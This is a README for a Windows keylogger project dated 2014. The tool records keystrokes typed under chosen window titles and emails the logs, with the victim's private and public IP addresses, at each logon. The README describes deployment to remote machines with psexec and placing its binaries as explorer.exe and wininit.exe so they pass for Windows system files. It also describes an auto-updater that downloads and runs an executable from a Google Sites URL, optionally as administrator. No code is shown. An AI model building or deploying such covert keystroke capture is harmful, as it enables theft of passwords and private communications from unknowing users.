# nils-keylogger
Keylogger which can record keystrokes typed under specific window titles and send captured keystrokes in email.

Version as on **2014 March**

--------------------------
## Features
- Can run under limited privileged user accounts
- Possible to deploy on remote machines using `psexec`
- Can update/patch itself on tenant basis. Uses update URL - `https://sites.google.com/site/nilsklg/<TenantID>.txt`

## Keylogger
- Location `%ProgramData%\System\explorer.exe`
- If sendTo = "none" then email is not sent

## Installer 7-Zip SFX
- Programmable `config.txt` with commandline options -ai0, -ai1 etc

## Send Mail/Updater
- Location `%ProgramData%\System\wininit.exe`
- Sends email containing recorded keylogs in body, on each logon
- Includes private IP, public IP in email
- If PubIPURL="none" then PublicIP is not sent
- AutoUpdate/Patch Feature-
	- Create file named "https://sites.google.com/site/nilsklg/" & TenantID & ".txt"
		NewVersion,"URL to Update.exe"
	- Program Will Check if New Version Available and Run Update.exe
    - If filename in URL ends with - it will run as administrator else limited user


### Config Files

- Used `%ProgramData%` environment variable for location
- The `u:` in log file directory path is replaced with `%USERPROFILE%`

*titles.txt*

	Location : %ProgramData%\System\titles.txt
	Content  : One window title per line, can be any number of titles

*settings.txt*

	Location : %ProgramData%\System\settings.txt
	Content  : LogDir, TenantID, sendTo, sendFrom, Sender Password, RetryTime, PubIPURL

*Keylogfile*

	Location       : LogDir in settings.txt or default C:\Users\Public\Libraries\NLogs
	Content(Line1) : Chr(155), Time, Date, TenantID, App.Revision
